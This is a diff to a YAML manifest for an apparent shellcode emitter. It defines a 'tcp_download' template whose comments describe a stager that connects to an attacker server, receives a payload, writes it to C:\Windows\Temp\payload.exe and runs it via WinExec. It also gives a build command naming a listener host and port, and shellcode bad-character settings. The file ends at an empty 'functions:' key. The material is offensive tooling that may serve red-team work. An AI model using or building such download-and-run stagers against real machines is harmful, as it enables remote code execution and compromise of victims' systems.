@@ -1,13 +1,12 @@
+template: tcp_download
 # TCP download-and-run.
 # Connects to attacker server, receives [uint32 LE size][raw bytes], writes to
 # dst_path, then executes it via WinExec.
 #
 # Build:
-#   uv run -m Tools.emitter Tools/emitter/manifests/tcp_download.yaml \
-#       --template tcp_download \
+#   uv run emitter Tools/emitter/manifests/tcp_download.yaml \
 #       --lhost 192.168.1.10 --lport 9002 \
-#       --dst "C:\\Windows\\Temp\\payload.exe" \
-#       --out emitter_out/
+#       --dst "C:\\Windows\\Temp\\payload.exe" --out emitter_out/
 badchars: ["00", "0a", "0d"]
 
 functions:
